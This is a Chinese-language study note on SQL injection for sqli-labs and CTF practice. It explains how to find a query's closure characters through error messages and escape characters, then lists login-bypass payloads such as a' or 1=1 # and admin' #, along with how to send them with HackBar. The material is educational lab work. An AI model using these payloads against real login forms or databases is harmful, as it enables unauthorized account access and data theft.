---
date: 2025-01-22
tags:
  - web
---
**做题步骤：**
1. 找到页面与数据库产生交互的地方
2. 查看SQL语句闭合方式
3. 进行SQL注入

## 查看SQL语句闭合方式
### 判断SQL语句闭合方式原理
> MYSQL数据库的包容性比较强，如果你输错了数据的类型，MYSQL数据库会自动将其转换成正确的数据类型，比如输入1)、1"、1-等，只要**数字后面的字符不是闭合符**的，数据库都会把你输入的错误的数据**转换成正确的数据类型**。
> 但是，若输入的**数字后面的字符恰好是闭合符**，则会形成闭合，若**闭合后形成的sql语句是错误的**，那么sql语句执行就会错误，从而**造成页面显示错误**。

例如：
在Mysql数据库下，代码如下：
```sql
$id=$_GET['id'];
$sql="SELECT * FROM name WHERE id='$id' LIMIT 0,1";
```
可以看到`’`(单引号)就是这条语句的闭合符
- 当**id输入的是`1)`**，那么拼接成的sql语句就是：
	`“SELECT * FROM name WHERE id=‘1)’ LIMIT 0,1”;`
	按理来说这个sql语句应该是错误的，执行会报错，但是因为是在Mysql数据库环境下，它会**自动把错误的数据`1)`转换成合法的数据`1`**，从而使得sql语句执行成功，相同的输入`1-`、`1"`也一样。
- 但是，若**id输入的是`1'`**，那么形成的sql语句就是：
	`"SELECT * FROM name WHERE id='1''（两个单引号） LIMIT 0,1";`  
	那么第1个单引号就和第2个单引号形成闭合，然后还剩下一个多余的第3个单引号，从而报错。

### 如何判断SQL注入闭合方式
sql的注入可以分为**数字类型，字符类型**

#### 方法1：  
首先我们可以**使用`\`(转义字符)来判断SQL注入的闭合方式。**
**原理：当闭合字符遇到转义字符时，会被转义，那么没有闭合符的语句就不完整了，就会报错，通过报错信息我们就可以推断出闭合符。** 
> 分析报错信息：看`\`斜杠后面跟着的字符，是什么字符，它的闭合字符就是什么，若是没有，就为数字型。

以sqli-labs靶场为例  
第一关闭合符为：`'`(单引号)
![[Pasted image 20250122234327.png]]

第二关闭合符为：无(数字型)
![[Pasted image 20250122234748.png]]

第三关闭合符为：`')`(单引号+括号)
![[Pasted image 20250122234812.png]]

第四关闭合符为：`")`(双引号+括号)
![[Pasted image 20250122234859.png]]

第五关闭合符为：`'`(单引号)
![[Pasted image 20250122235005.png]]


#### 方法二：
闭合方式无非不就**单引号，双引号，括号的随机搭配**

下面先看看**有报错回显**的情况：
**做题：首先得先引起报错**，这里`LIMIT0,1`右边的`'`是和 `' '2''`的第一个单引号永远是一对的，接下来就看除了你输入的闭合符号，其余的符号是否能做到一一对应，如果可以，那么你的闭合方式就是对的。
报错：`' '2'' LIMIT 0,1 ' at line 1`
> 这里引起报错就是因为输入的那个`'`变成了单身狗，就报错了

传入`1'`:
报错：`near ''1'') LlMlT 0,1' at line 1`
这里**limit0.1**右边的单引号已经**和`''1'')`的第一个单引号闭合了，除去我输入的闭合符号外，这里有一个右括号没有对应的，那么给它加上一个括号就好，?id=1')**

如果是**无回显**的情况：
这里**首先先让它报错**，双引号是不行的，用单引号，可以判断单引号是一个闭合符。
![[Pasted image 20250123002113.png]]
接下来说一个**如何判断自己是对**的的判断法则：
**在后面加上--+，接下来如果出现真页面而不是报错，那么你的闭合方式给一定正确。**

**前面已经判断出单引号是一个闭合符了，接下来就大胆加入括号），再进行判断，发现还是不行，那就再加一个括号，之后用法则判断，直接搞定，so easy！**
传入`1'))--+`:
![[Pasted image 20250123002409.png]]


## 进行SQL注入
### 方法一：万能账号密码
#### 1. 万能账号
当我们不知道用户的账号并且不知道用户的密码时，可以使用万能账号。
万能账号并不是一个真正意义上的账号，它是一种【拥有不同变体的格式】
需要注意的是，以下所有万能账号中的a可以是自定义的数字或字母，比如1，2，3，b，c，d
```
【数值型万能账号】
a or true #
a or 1 #
a or 1=1 #
a or true -- a
a or 1 -- a
a or 1=1 -- a

【单引号字符型万能密码】
a' or true #
a' or 1 #
a' or 1=1 #
a' or true --a
a' or 1 -- a
a' or 1=1 -- a

【双引号字符型万能密码】
a" or true #
a" or 1 #
a" or 1=1 #
a" or true -- a
a" or 1 -- a
a" or 1=1 -- a
```
##### 1.1 万能账号的使用
账号输入【万能账号】， 比如`a or true #`
密码随便输入，比如 123456

#### 2.万能密码
当我们知道用户的账号，但不知道用户的密码时，可以使用万能密码
万能密码并不是一个真正意义上的密码，而是一个【拥有不同变体的格式】
需要注意的是：**万能密码中的 admin，必须是真实的用户名**
```
【数值型万能密码】
admin #
admin -- a

【单引号字符串型万能密码】
admin' #
admin' -- a

【双引号字符串型万能密码】
admin" #
admin" -- a
```
##### 2.1 万能密码的使用
用户名输入 【万能密码】，比如 `admin' #`
密码随便输入，比如 123456

#### 万能账号密码原理剖析
![[Pasted image 20250123004317.png]]

### 方法二：使用HackBar进行SQL注入
思路和万能密码是一致的，这里学习一下HackBar的使用方式
#### 查看页面的传参方式
![[Pasted image 20250123005259.png]]
#### 使用HackBar进行SQL注入
> Load URL（加载网址）:将网址“框”下来
> Split URL（切分网址）：自动切分网址，便于快速找出需要修的地方
> Execute（执行）：相当于F5

先“Load URL”，然后在框中类比刚刚传参的样子输入语句，然后点击“Execute”
> GET传参要经过url编码，所以使用url进行输入时，不能使用#，而应该使用其url编码%23
![[Pasted image 20250123005606.png]]

